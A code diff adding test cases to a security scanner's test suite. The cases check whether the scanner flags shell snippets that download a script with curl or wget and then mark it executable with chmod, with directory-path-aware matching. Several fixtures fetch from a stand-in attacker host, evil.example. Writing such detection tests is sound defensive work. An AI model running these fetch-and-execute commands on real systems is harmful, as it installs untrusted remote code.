@@ -667,6 +667,39 @@ describe('core <-> edge suspicious_pattern parity (SMI-5402)', () => {
         content: 'wget https://example.com/\necho a\necho b\nchmod 755 example.com',
         expectFire: false,
       },
+      // SMI-6033 Wave 3 (adversarial-review fix): isCorrelatedWithFetchDestination is now
+      // DIRECTORY-PATH-AWARE. A coincidental basename collision between two unrelated files
+      // in DIFFERENT real directories must not correlate; a bare filename on either side has
+      // no path information to distinguish by, so it must still fall back to final-segment
+      // matching. Core and edge must agree on all four shapes.
+      {
+        label:
+          'curl -o /tmp/install.sh … chmod ./vendor/other-tool/install.sh (basename collision, different dirs, no fire)',
+        content:
+          'curl -o /tmp/install.sh https://example.com/install.sh\necho a\necho b\nchmod +x ./vendor/other-tool/install.sh',
+        expectFire: false,
+      },
+      {
+        label: 'curl -o /tmp/pkg.sh … chmod /tmp/pkg.sh (same dir both sides, HIGH)',
+        content:
+          'curl -o /tmp/pkg.sh https://evil.example/pkg.sh\necho a\necho b\nchmod +x /tmp/pkg.sh',
+        expectFire: true,
+        expectSeverity: 'high',
+      },
+      {
+        label: 'curl -o ./bin/pkg.sh … chmod bin/pkg.sh (./-normalized same dir, HIGH)',
+        content:
+          'curl -o ./bin/pkg.sh https://evil.example/pkg.sh\necho a\necho b\nchmod +x bin/pkg.sh',
+        expectFire: true,
+        expectSeverity: 'high',
+      },
+      {
+        label:
+          'wget implicit URL segment … chmod bare basename (no dir on either side, still HIGH)',
+        content: 'wget https://evil.example/install.sh\necho a\necho b\nchmod +x install.sh',
+        expectFire: true,
+        expectSeverity: 'high',
+      },
     ]
     for (const { label, content, expectFire, expectSeverity } of cases) {
       const coreReport = scanner.scan('parity', content)
